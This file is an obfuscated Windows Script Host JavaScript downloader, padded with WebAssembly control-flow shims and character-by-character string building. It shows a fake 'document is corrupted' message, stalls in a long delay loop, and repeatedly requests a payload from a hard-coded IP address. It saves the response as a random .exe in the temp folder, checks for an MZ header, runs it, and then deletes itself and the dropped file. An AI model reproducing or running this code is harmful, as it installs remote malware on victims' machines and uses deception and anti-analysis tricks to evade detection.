const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __ifWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAF/AAKfgICAAAIDZW52CGltcEZ1bmMxAAADZW52CGltcEZ1bmMyAAADgoCAgAABAQSEgICAAAFwAAAFg4CAgAABAAEHkYCAgAACBm1lbW9yeQIABGRhdGEAAgqSgICAAAGMgICAAAAgAARAEAAFEAELCw==';
const __ifWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__ifWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__ifWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEG2oCAgAAQfwBBAQt/AEEEC38AQQwLfwBBHAt/AEEmC38AQSwLfwBBNgt/AEHAAAt/AEHKAAt/AEHQAAt/AEHWAAt/AEHgAAt/AEHqAAt/AEH2AAt/AEH8AAt/AEGCAQsHkIGAgAARBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIBWRhdGE5AwkGZGF0YTEwAwoGZGF0YTExAwsGZGF0YTEyAwwGZGF0YTEzAw0GZGF0YTE0Aw4GZGF0YTE1Aw8LzIGAgAAQAEEBCwEAAEEECwZ0aGlzMgAAQQwLDkFtV2hhdGV2ZXJEcmUAAEEcCwltZWFuZXN0OQAAQSYLBXRoaXMAAEEsCwhhaXl5b0kzAABBNgsIdGhpbmdJbQAAQcAACwliZXJzZXJrOQAAQcoACwVqdXN0AABB0AALBWp1c3QAAEHWAAsIcHJpY2tJZgAAQeAACwlFYXJ0aEFuZAAAQeoACwpjb3VydHJvb20AAEH2AAsFYWlySQAAQfwACwV0aGlzAABBggELB21lYW4xMAA='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
pre_which = undefined;
pre_Kings = undefined;
pre_group10 = undefined;
pre_Henry = undefined;
pre_patent = undefined;
pre_appears = undefined;
pre_been3 = undefined;
pre_tradition = undefined;
pre_names = undefined;
pre_writing4 = undefined;
pre_theatrical = undefined;
pre_target3 = undefined;
pre_Chorus8 = undefined;
pre_coatofarms4 = undefined;
pre_career = undefined;
var ActXN = this[{ han0: 'A' }.han0 + { r2: 'c' }.r2 + { ugg1: 't' }.ugg1 + { ere0: 'i' }.ere0 + { a0: 'v' }.a0 + { e1: 'e' }.e1 + { a2: 'X' }.a2 + { it3: 'O' }.it3 + { ch2: 'b' }.ch2 + { ar3: 'j' }.ar3 + { ho2: 'e' }.ho2 + { o1: 'c' }.o1 + { he1: 't' }.he1];
var WSSS12 = this[{ rin2: 'W' }.rin2 + { r1: 'S' }.r1 + { c0: 'c' }.c0 + { h0: 'r' }.h0 + { om0: 'i' }.om0 + { am2: 'p' }.am2 + { ol0: 't' }.ol0];
var WshShell = WSSS12[{ oy0: 'C' }.oy0 + { oh0: 'r' }.oh0 + { lo1: 'e' }.lo1 + { o1: 'a' }.o1 + { pri1: 't' }.pri1 + { l0: 'e' }.l0 + { ho3: 'O' }.ho3 + { urv1: 'b' }.urv1 + { h3: 'j' }.h3 + { ou2: 'e' }.ou2 + { h3: 'c' }.h3 + { ro2: 't' }.ro2]({ e0: 'W' }.e0 + { ar2: 'S' }.ar2 + { hat3: 'c' }.hat3 + { v2: 'r' }.v2 + { lex2: 'i' }.lex2 + { cho2: 'p' }.cho2 + { ro1: 't' }.ro1 + { hen0: '.' }.hen0 + { am1: 'S' }.am1 + { id3: 'h' }.id3 + { art3: 'e' }.art3 + { our0: 'l' }.our0 + { u1: 'l' }.u1);
var pre_period = new ActXN({ hat1: 'S' }.hat1 + { o0: 'c' }.o0 + { el1: 'r' }.el1 + { ex1: 'i' }.ex1 + { all0: 'p' }.all0 + { b0: 't' }.b0 + { hi2: 'i' }.hi2 + { u3: 'n' }.u3 + { av1: 'g' }.av1 + { cto1: '.' }.cto1 + { la0: 'F' }.la0 + { ree2: 'i' }.ree2 + { u1: 'l' }.u1 + { tra0: 'e' }.tra0 + { ccu2: 'S' }.ccu2 + { avi0: 'y' }.avi0 + { ev1: 's' }.ev1 + { ugg1: 't' }.ugg1 + { o1: 'e' }.o1 + { e0: 'm' }.e0 + { du1: 'O' }.du1 + { oug3: 'b' }.oug3 + { hak0: 'j' }.hak0 + { l0: 'e' }.l0 + { d3: 'c' }.d3 + { l3: 't' }.l3);
var pre_August = new ActXN({ th3: 'A' }.th3 + { im3: 'D' }.im3 + { ua2: 'O' }.ua2 + { est2: 'D' }.est2 + { it1: 'B' }.it1 + { uar0: '.' }.uar0 + { ome1: 'S' }.ome1 + { are0: 't' }.are0 + { hak0: 'r' }.hak0 + { e3: 'e' }.e3 + { c3: 'a' }.c3 + { i3: 'm' }.i3);
var pre_Greene4 = new ActXN({ h2: 'S' }.h2 + { u3: 'h' }.u3 + { hak3: 'e' }.hak3 + { xi2: 'l' }.xi2 + { ch3: 'l' }.ch3 + { ha0: '.' }.ha0 + { u3: 'A' }.u3 + { hat2: 'p' }.hat2 + { hak1: 'p' }.hak1 + { cu2: 'l' }.cu2 + { lov0: 'i' }.lov0 + { ei3: 'c' }.ei3 + { ce1: 'a' }.ce1 + { ie3: 't' }.ie3 + { han0: 'i' }.han0 + { r2: 'o' }.r2 + { ugg1: 'n' }.ugg1);
var temp12 = WshShell[{ ere0: 'E' }.ere0 + { a0: 'x' }.a0 + { e1: 'p' }.e1 + { a2: 'a' }.a2 + { it3: 'n' }.it3 + { ch2: 'd' }.ch2 + { ar3: 'E' }.ar3 + { ho2: 'n' }.ho2 + { o1: 'v' }.o1 + { he1: 'i' }.he1 + { rin2: 'r' }.rin2 + { r1: 'o' }.r1 + { c0: 'n' }.c0 + { h0: 'm' }.h0 + { om0: 'e' }.om0 + { am2: 'n' }.am2 + { ol0: 't' }.ol0 + { oy0: 'S' }.oy0 + { oh0: 't' }.oh0 + { lo1: 'r' }.lo1 + { o1: 'i' }.o1 + { pri1: 'n' }.pri1 + { l0: 'g' }.l0 + { ho3: 's' }.ho3]({ urv1: '%' }.urv1 + { h3: 'T' }.h3 + { ou2: 'E' }.ou2 + { h3: 'M' }.h3 + { ro2: 'P' }.ro2 + { e0: '%' }.e0);
var filepath = temp12 + String[{ ar2: 'f' }.ar2 + { hat3: 'r' }.hat3 + { v2: 'o' }.v2 + { lex2: 'm' }.lex2 + { cho2: 'C' }.cho2 + { ro1: 'h' }.ro1 + { hen0: 'a' }.hen0 + { am1: 'r' }.am1 + { id3: 'C' }.id3 + { art3: 'o' }.art3 + { our0: 'd' }.our0 + { u1: 'e' }.u1](92) + Math[{ hat1: 'f' }.hat1 + { o0: 'l' }.o0 + { el1: 'o' }.el1 + { ex1: 'o' }.ex1 + { all0: 'r' }.all0](Math[{ b0: 'r' }.b0 + { hi2: 'a' }.hi2 + { u3: 'n' }.u3 + { av1: 'd' }.av1 + { cto1: 'o' }.cto1 + { la0: 'm' }.la0]() * 100 + 1) + { ree2: '.' }.ree2 + { u1: 'e' }.u1 + { tra0: 'x' }.tra0 + { ccu2: 'e' }.ccu2;
var xhr12 = new ActXN({ avi0: 'M' }.avi0 + { ev1: 's' }.ev1 + { ugg1: 'x' }.ugg1 + { o1: 'm' }.o1 + { e0: 'l' }.e0 + { du1: '2' }.du1 + { oug3: '.' }.oug3 + { hak0: 'S' }.hak0 + { l0: 'e' }.l0 + { d3: 'r' }.d3 + { l3: 'v' }.l3 + { th3: 'e' }.th3 + { im3: 'r' }.im3 + { ua2: 'X' }.ua2 + { est2: 'M' }.est2 + { it1: 'L' }.it1 + { uar0: 'H' }.uar0 + { ome1: 'T' }.ome1 + { are0: 'T' }.are0 + { hak0: 'P' }.hak0);
var pre_house2 = String[{ ar2: 'f' }.ar2 + { hat3: 'r' }.hat3 + { v2: 'o' }.v2 + { lex2: 'm' }.lex2 + { cho2: 'C' }.cho2 + { ro1: 'h' }.ro1 + { hen0: 'a' }.hen0 + { am1: 'r' }.am1 + { id3: 'C' }.id3 + { art3: 'o' }.art3 + { our0: 'd' }.our0 + { u1: 'e' }.u1](92) + { cu2: 'a' }.cu2 + { lov0: 'd' }.lov0 + { ei3: 'o' }.ei3 + { ce1: 'b' }.ce1 + { ie3: 'e' }.ie3 + { han0: '_' }.han0 + { r2: 'u' }.r2 + { ugg1: 'p' }.ugg1 + { ere0: 'd' }.ere0 + { a0: 'a' }.a0 + { e1: 't' }.e1 + { a2: 'e' }.a2 + { it3: '.' }.it3 + { ch2: 'j' }.ch2 + { ar3: 's' }.ar3;
var startupFolder = pre_Greene4[{ ho2: 'N' }.ho2 + { o1: 'a' }.o1 + { he1: 'm' }.he1 + { rin2: 'e' }.rin2 + { r1: 'S' }.r1 + { c0: 'p' }.c0 + { h0: 'a' }.h0 + { om0: 'c' }.om0 + { am2: 'e' }.am2](3 + 2 + 2);
var pre_scurrilous = false;
var pre_originally10 = false;
var tone = 1;
var pre_being4 = 0;
var icount = 0;
var mz12 = { ol0: 'M' }.ol0 + { oy0: 'Z' }.oy0;
var empty12 = lS(0, 0);
var pre_parts4 = WSSS12[{ oh0: 'S' }.oh0 + { lo1: 'c' }.lo1 + { o1: 'r' }.o1 + { pri1: 'i' }.pri1 + { l0: 'p' }.l0 + { ho3: 't' }.ho3 + { urv1: 'F' }.urv1 + { h3: 'u' }.h3 + { ou2: 'l' }.ou2 + { h3: 'l' }.h3 + { ro2: 'N' }.ro2 + { e0: 'a' }.e0 + { ar2: 'm' }.ar2 + { hat3: 'e' }.hat3];
var pre_April = startupFolder.Self.Path + pre_house2;
var uidhere = pre_April;
var url12 = { v2: 'h' }.v2 + { lex2: 't' }.lex2 + { cho2: 't' }.cho2 + { ro1: 'p' }.ro1 + { hen0: 's' }.hen0 + { am1: ':' }.am1 + { id3: '/' }.id3 + { art3: '/' }.art3 + { our0: '1' }.our0 + { u1: '8' }.u1 + { hat1: '5' }.hat1 + { o0: '.' }.o0 + { el1: '1' }.el1 + { ex1: '3' }.ex1 + { all0: '0' }.all0 + { b0: '.' }.b0 + { hi2: '1' }.hi2 + { u3: '0' }.u3 + { av1: '4' }.av1 + { cto1: '.' }.cto1 + { la0: '1' }.la0 + { ree2: '6' }.ree2 + { u1: '7' }.u1 + { tra0: '/' }.tra0 + { ccu2: 'T' }.ccu2 + { avi0: 'A' }.avi0 + { ev1: 'L' }.ev1 + { ugg1: 'L' }.ugg1 + { o1: '/' }.o1 + { e0: 'q' }.e0 + { du1: '6' }.du1 + { oug3: '4' }.oug3 + { hak0: '.' }.hak0 + { l0: 'p' }.l0 + { d3: 'h' }.d3 + { l3: 'p' }.l3 + { th3: '?' }.th3 + { im3: 'a' }.im3 + { ua2: 'd' }.ua2 + { est2: 'd' }.est2 + { it1: '=' }.it1 + { uar0: 'g' }.uar0 + { ome1: 'y' }.ome1 + { are0: 'u' }.are0 + { hak0: '7' }.hak0 + { e3: '9' }.e3 + { c3: 'j' }.c3 + { i3: 'h' }.i3 + { h2: 'u' }.h2 + { u3: 'i' }.u3 + { hak3: 'j' }.hak3 + { xi2: 'k' }.xi2 + { ch3: 'o' }.ch3 + { ha0: 'm' }.ha0 + { u3: 'n' }.u3 + { hat2: 'b' }.hat2 + { hak1: 'l' }.hak1 + { cu2: 'o' }.cu2 + { lov0: 'p' }.lov0 + { ei3: 'q' }.ei3 + { ce1: 'w' }.ce1 + { ie3: 'e' }.ie3 + { han0: 'c' }.han0 + { r2: 'y' }.r2 + { ugg1: 'h' }.ugg1 + { ere0: '7' }.ere0 + { a0: '0' }.a0 + { e1: '9' }.e1 + { a2: '1' }.a2 + { it3: 'h' }.it3 + { ch2: 'h' }.ch2;
(() => {
    const __ifInstance0 = new WebAssembly.Instance(__ifWasmModule, {
        env: {
            impFunc1: () => {
                {
                    pre_scurrilous = true;
                    (() => {
                        const __callInstance15 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    pre_period[{ ar3: 'D' }.ar3 + { ho2: 'e' }.ho2 + { o1: 'l' }.o1 + { he1: 'e' }.he1 + { rin2: 't' }.rin2 + { r1: 'e' }.r1 + { c0: 'F' }.c0 + { h0: 'i' }.h0 + { om0: 'l' }.om0 + { am2: 'e' }.am2](pre_parts4);
                                }
                            }
                        });
                        const __exports = __callInstance15.exports;
                        return __exports.data();
                    })();
                    (() => {
                        const __callInstance14 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    WSSS12[{ ol0: 'e' }.ol0 + { oy0: 'c' }.oy0 + { oh0: 'h' }.oh0 + { lo1: 'o' }.lo1]({ o1: 'T' }.o1 + { pri1: 'h' }.pri1 + { l0: 'e' }.l0 + { ho3: ' ' }.ho3 + { urv1: 'd' }.urv1 + { h3: 'o' }.h3 + { ou2: 'c' }.ou2 + { h3: 'u' }.h3 + { ro2: 'm' }.ro2 + { e0: 'e' }.e0 + { ar2: 'n' }.ar2 + { hat3: 't' }.hat3 + { v2: ' ' }.v2 + { lex2: 'i' }.lex2 + { cho2: 's' }.cho2 + { ro1: ' ' }.ro1 + { hen0: 'c' }.hen0 + { am1: 'o' }.am1 + { id3: 'r' }.id3 + { art3: 'r' }.art3 + { our0: 'u' }.our0 + { u1: 'p' }.u1 + { hat1: 't' }.hat1 + { o0: 'e' }.o0 + { el1: 'd' }.el1 + { ex1: ' ' }.ex1 + { all0: 'a' }.all0 + { b0: 'n' }.b0 + { hi2: 'd' }.hi2 + { u3: ' ' }.u3 + { av1: 'c' }.av1 + { cto1: 'a' }.cto1 + { la0: 'n' }.la0 + { ree2: 'n' }.ree2 + { u1: 'o' }.u1 + { tra0: 't' }.tra0 + { ccu2: ' ' }.ccu2 + { avi0: 'b' }.avi0 + { ev1: 'e' }.ev1 + { ugg1: ' ' }.ugg1 + { o1: 'o' }.o1 + { e0: 'p' }.e0 + { du1: 'e' }.du1 + { oug3: 'n' }.oug3 + { hak0: 'e' }.hak0 + { l0: 'd' }.l0);
                                }
                            }
                        });
                        const __exports = __callInstance14.exports;
                        return __exports.data();
                    })();
                    (() => {
                        const __callInstance13 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    WSSS12[{ d3: 'S' }.d3 + { l3: 'l' }.l3 + { th3: 'e' }.th3 + { im3: 'e' }.im3 + { ua2: 'p' }.ua2](5000);
                                }
                            }
                        });
                        const __exports = __callInstance13.exports;
                        return __exports.data();
                    })();
                }
            },
            impFunc2: () => {
            }
        }
    });
    const __exports = __ifInstance0.exports;
    return __exports.data(pre_parts4 != pre_April && pre_scurrilous == false ? 1 : 0);
})();
(() => {
    icount = 0;
    const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
        env: {
            test: () => {
                return icount < uidhere[{ est2: 'l' }.est2 + { it1: 'e' }.it1 + { uar0: 'n' }.uar0 + { ome1: 'g' }.ome1 + { are0: 't' }.are0 + { hak0: 'h' }.hak0] ? 1 : 0;
            },
            update: () => {
                icount++;
            },
            body: () => {
                {
                    pre_being4 = (pre_being4 << 5) - pre_being4 + uidhere[{ e3: 'c' }.e3 + { c3: 'h' }.c3 + { i3: 'a' }.i3 + { h2: 'r' }.h2 + { u3: 'C' }.u3 + { hak3: 'o' }.hak3 + { xi2: 'd' }.xi2 + { ch3: 'e' }.ch3 + { ha0: 'A' }.ha0 + { u3: 't' }.u3](icount) & 4294967295;
                }
            }
        }
    });
    const __exports = __forInstance0.exports;
    return __exports.data();
})();
while (true) {
    tone = tone + 1;
    if (tone == 300000000) {
        while (true) {
            try {
                (() => {
                    const __callInstance12 = new WebAssembly.Instance(__callWasmModule, {
                        env: {
                            impFunc: () => {
                                xhr12[{ hat2: 's' }.hat2 + { hak1: 'e' }.hak1 + { cu2: 't' }.cu2 + { lov0: 'O' }.lov0 + { ei3: 'p' }.ei3 + { ce1: 't' }.ce1 + { ie3: 'i' }.ie3 + { han0: 'o' }.han0 + { r2: 'n' }.r2](3, { ugg1: 'M' }.ugg1 + { ere0: 'S' }.ere0 + { a0: 'X' }.a0 + { e1: 'M' }.e1 + { a2: 'L' }.a2);
                            }
                        }
                    });
                    const __exports = __callInstance12.exports;
                    return __exports.data();
                })();
                (() => {
                    const __callInstance11 = new WebAssembly.Instance(__callWasmModule, {
                        env: {
                            impFunc: () => {
                                xhr12[{ it3: 'o' }.it3 + { ch2: 'p' }.ch2 + { ar3: 'e' }.ar3 + { ho2: 'n' }.ho2]({ o1: 'G' }.o1 + { he1: 'E' }.he1 + { rin2: 'T' }.rin2, url12 + { r1: '&' }.r1 + Math[{ hat1: 'f' }.hat1 + { o0: 'l' }.o0 + { el1: 'o' }.el1 + { ex1: 'o' }.ex1 + { all0: 'r' }.all0](Math[{ b0: 'r' }.b0 + { hi2: 'a' }.hi2 + { u3: 'n' }.u3 + { av1: 'd' }.av1 + { cto1: 'o' }.cto1 + { la0: 'm' }.la0]() * 200 + 1) + { ho3: '&' }.ho3 + { urv1: 'u' }.urv1 + { h3: 'i' }.h3 + { ou2: 'd' }.ou2 + { h3: '=' }.h3 + Math[{ ro2: 'a' }.ro2 + { e0: 'b' }.e0 + { ar2: 's' }.ar2](pre_being4), false);
                            }
                        }
                    });
                    const __exports = __callInstance11.exports;
                    return __exports.data();
                })();
                (() => {
                    const __callInstance10 = new WebAssembly.Instance(__callWasmModule, {
                        env: {
                            impFunc: () => {
                                xhr12[{ hat3: 's' }.hat3 + { v2: 'e' }.v2 + { lex2: 'n' }.lex2 + { cho2: 'd' }.cho2]();
                            }
                        }
                    });
                    const __exports = __callInstance10.exports;
                    return __exports.data();
                })();
                if (xhr12[{ ro1: 's' }.ro1 + { hen0: 't' }.hen0 + { am1: 'a' }.am1 + { id3: 't' }.id3 + { art3: 'u' }.art3 + { our0: 's' }.our0] == 50 + 50 + 50 + 50) {
                    icount = 0;
                    (() => {
                        const __ifInstance1 = new WebAssembly.Instance(__ifWasmModule, {
                            env: {
                                impFunc1: () => {
                                    (() => {
                                        const __callInstance9 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    pre_period[{ ar3: 'D' }.ar3 + { ho2: 'e' }.ho2 + { o1: 'l' }.o1 + { he1: 'e' }.he1 + { rin2: 't' }.rin2 + { r1: 'e' }.r1 + { c0: 'F' }.c0 + { h0: 'i' }.h0 + { om0: 'l' }.om0 + { am2: 'e' }.am2](filepath);
                                                }
                                            }
                                        });
                                        const __exports = __callInstance9.exports;
                                        return __exports.data();
                                    })();
                                },
                                impFunc2: () => {
                                }
                            }
                        });
                        const __exports = __ifInstance1.exports;
                        return __exports.data(pre_period[{ u1: 'F' }.u1 + { hat1: 'i' }.hat1 + { o0: 'l' }.o0 + { el1: 'e' }.el1 + { ex1: 'E' }.ex1 + { all0: 'x' }.all0 + { b0: 'i' }.b0 + { hi2: 's' }.hi2 + { u3: 't' }.u3 + { av1: 's' }.av1](filepath) ? 1 : 0);
                    })();
                    (() => {
                        const __callInstance8 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    pre_August[{ e0: 'O' }.e0 + { du1: 'p' }.du1 + { oug3: 'e' }.oug3 + { hak0: 'n' }.hak0]();
                                }
                            }
                        });
                        const __exports = __callInstance8.exports;
                        return __exports.data();
                    })();
                    pre_August[{ l0: 'T' }.l0 + { d3: 'y' }.d3 + { l3: 'p' }.l3 + { th3: 'e' }.th3] = 1;
                    (() => {
                        const __callInstance7 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    pre_August[{ im3: 'W' }.im3 + { ua2: 'r' }.ua2 + { est2: 'i' }.est2 + { it1: 't' }.it1 + { uar0: 'e' }.uar0](xhr12[{ ome1: 'r' }.ome1 + { are0: 'e' }.are0 + { hak0: 's' }.hak0 + { e3: 'p' }.e3 + { c3: 'o' }.c3 + { i3: 'n' }.i3 + { h2: 's' }.h2 + { u3: 'e' }.u3 + { hak3: 'B' }.hak3 + { xi2: 'o' }.xi2 + { ch3: 'd' }.ch3 + { ha0: 'y' }.ha0]);
                                }
                            }
                        });
                        const __exports = __callInstance7.exports;
                        return __exports.data();
                    })();
                    icount = pre_August[{ u3: 'S' }.u3 + { hat2: 'i' }.hat2 + { hak1: 'z' }.hak1 + { cu2: 'e' }.cu2];
                    empty12 = xhr12[{ lov0: 'r' }.lov0 + { ei3: 'e' }.ei3 + { ce1: 's' }.ce1 + { ie3: 'p' }.ie3 + { han0: 'o' }.han0 + { r2: 'n' }.r2 + { ugg1: 's' }.ugg1 + { ere0: 'e' }.ere0 + { a0: 'T' }.a0 + { e1: 'e' }.e1 + { a2: 'x' }.a2 + { it3: 't' }.it3];
                    empty12 = empty12[{ ch2: 's' }.ch2 + { ar3: 'u' }.ar3 + { ho2: 'b' }.ho2 + { o1: 's' }.o1 + { he1: 't' }.he1 + { rin2: 'r' }.rin2 + { r1: 'i' }.r1 + { c0: 'n' }.c0 + { h0: 'g' }.h0](0, 2);
                    pre_August[{ om0: 'P' }.om0 + { am2: 'o' }.am2 + { ol0: 's' }.ol0 + { oy0: 'i' }.oy0 + { oh0: 't' }.oh0 + { lo1: 'i' }.lo1 + { o1: 'o' }.o1 + { pri1: 'n' }.pri1] = 0;
                    (() => {
                        const __callInstance6 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    pre_August[{ l0: 'S' }.l0 + { ho3: 'a' }.ho3 + { urv1: 'v' }.urv1 + { h3: 'e' }.h3 + { ou2: 'T' }.ou2 + { h3: 'o' }.h3 + { ro2: 'F' }.ro2 + { e0: 'i' }.e0 + { ar2: 'l' }.ar2 + { hat3: 'e' }.hat3](filepath);
                                }
                            }
                        });
                        const __exports = __callInstance6.exports;
                        return __exports.data();
                    })();
                    (() => {
                        const __callInstance5 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    pre_August[{ v2: 'C' }.v2 + { lex2: 'l' }.lex2 + { cho2: 'o' }.cho2 + { ro1: 's' }.ro1 + { hen0: 'e' }.hen0]();
                                }
                            }
                        });
                        const __exports = __callInstance5.exports;
                        return __exports.data();
                    })();
                    if (pre_period[{ u1: 'F' }.u1 + { hat1: 'i' }.hat1 + { o0: 'l' }.o0 + { el1: 'e' }.el1 + { ex1: 'E' }.ex1 + { all0: 'x' }.all0 + { b0: 'i' }.b0 + { hi2: 's' }.hi2 + { u3: 't' }.u3 + { av1: 's' }.av1](filepath) && icount > 500 && empty12 == mz12) {
                        pre_originally10 = true;
                        (() => {
                            const __callInstance4 = new WebAssembly.Instance(__callWasmModule, {
                                env: {
                                    impFunc: () => {
                                        WshShell[{ b0: 'E' }.b0 + { hi2: 'x' }.hi2 + { u3: 'e' }.u3 + { av1: 'c' }.av1](filepath);
                                    }
                                }
                            });
                            const __exports = __callInstance4.exports;
                            return __exports.data();
                        })();
                        (() => {
                            const __ifInstance2 = new WebAssembly.Instance(__ifWasmModule, {
                                env: {
                                    impFunc1: () => {
                                        (() => {
                                            const __callInstance3 = new WebAssembly.Instance(__callWasmModule, {
                                                env: {
                                                    impFunc: () => {
                                                        pre_period[{ ar3: 'D' }.ar3 + { ho2: 'e' }.ho2 + { o1: 'l' }.o1 + { he1: 'e' }.he1 + { rin2: 't' }.rin2 + { r1: 'e' }.r1 + { c0: 'F' }.c0 + { h0: 'i' }.h0 + { om0: 'l' }.om0 + { am2: 'e' }.am2](WSSS12[{ oh0: 'S' }.oh0 + { lo1: 'c' }.lo1 + { o1: 'r' }.o1 + { pri1: 'i' }.pri1 + { l0: 'p' }.l0 + { ho3: 't' }.ho3 + { urv1: 'F' }.urv1 + { h3: 'u' }.h3 + { ou2: 'l' }.ou2 + { h3: 'l' }.h3 + { ro2: 'N' }.ro2 + { e0: 'a' }.e0 + { ar2: 'm' }.ar2 + { hat3: 'e' }.hat3]);
                                                    }
                                                }
                                            });
                                            const __exports = __callInstance3.exports;
                                            return __exports.data();
                                        })();
                                    },
                                    impFunc2: () => {
                                    }
                                }
                            });
                            const __exports = __ifInstance2.exports;
                            return __exports.data(pre_period[{ u1: 'F' }.u1 + { hat1: 'i' }.hat1 + { o0: 'l' }.o0 + { el1: 'e' }.el1 + { ex1: 'E' }.ex1 + { all0: 'x' }.all0 + { b0: 'i' }.b0 + { hi2: 's' }.hi2 + { u3: 't' }.u3 + { av1: 's' }.av1](WSSS12[{ oh0: 'S' }.oh0 + { lo1: 'c' }.lo1 + { o1: 'r' }.o1 + { pri1: 'i' }.pri1 + { l0: 'p' }.l0 + { ho3: 't' }.ho3 + { urv1: 'F' }.urv1 + { h3: 'u' }.h3 + { ou2: 'l' }.ou2 + { h3: 'l' }.h3 + { ro2: 'N' }.ro2 + { e0: 'a' }.e0 + { ar2: 'm' }.ar2 + { hat3: 'e' }.hat3]) ? 1 : 0);
                        })();
                        (() => {
                            const __callInstance2 = new WebAssembly.Instance(__callWasmModule, {
                                env: {
                                    impFunc: () => {
                                        WSSS12[{ d3: 'S' }.d3 + { l3: 'l' }.l3 + { th3: 'e' }.th3 + { im3: 'e' }.im3 + { ua2: 'p' }.ua2](5000);
                                    }
                                }
                            });
                            const __exports = __callInstance2.exports;
                            return __exports.data();
                        })();
                        (() => {
                            const __ifInstance3 = new WebAssembly.Instance(__ifWasmModule, {
                                env: {
                                    impFunc1: () => {
                                        (() => {
                                            const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                                                env: {
                                                    impFunc: () => {
                                                        pre_period[{ ar3: 'D' }.ar3 + { ho2: 'e' }.ho2 + { o1: 'l' }.o1 + { he1: 'e' }.he1 + { rin2: 't' }.rin2 + { r1: 'e' }.r1 + { c0: 'F' }.c0 + { h0: 'i' }.h0 + { om0: 'l' }.om0 + { am2: 'e' }.am2](filepath);
                                                    }
                                                }
                                            });
                                            const __exports = __callInstance1.exports;
                                            return __exports.data();
                                        })();
                                    },
                                    impFunc2: () => {
                                    }
                                }
                            });
                            const __exports = __ifInstance3.exports;
                            return __exports.data(pre_period[{ u1: 'F' }.u1 + { hat1: 'i' }.hat1 + { o0: 'l' }.o0 + { el1: 'e' }.el1 + { ex1: 'E' }.ex1 + { all0: 'x' }.all0 + { b0: 'i' }.b0 + { hi2: 's' }.hi2 + { u3: 't' }.u3 + { av1: 's' }.av1](filepath) ? 1 : 0);
                        })();
                        break;
                    }
                }
            } catch (e) {
            }
            if (pre_originally10 == true) {
                break;
            }
            (() => {
                const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
                    env: {
                        impFunc: () => {
                            WSSS12[{ d3: 'S' }.d3 + { l3: 'l' }.l3 + { th3: 'e' }.th3 + { im3: 'e' }.im3 + { ua2: 'p' }.ua2](10000 * 7);
                        }
                    }
                });
                const __exports = __callInstance0.exports;
                return __exports.data();
            })();
        }
        break;
    }
}
;
pre_success7 = lS(0, 1);
pre_best = lS(0, 2);
pre_stories5 = lS(0, 3);
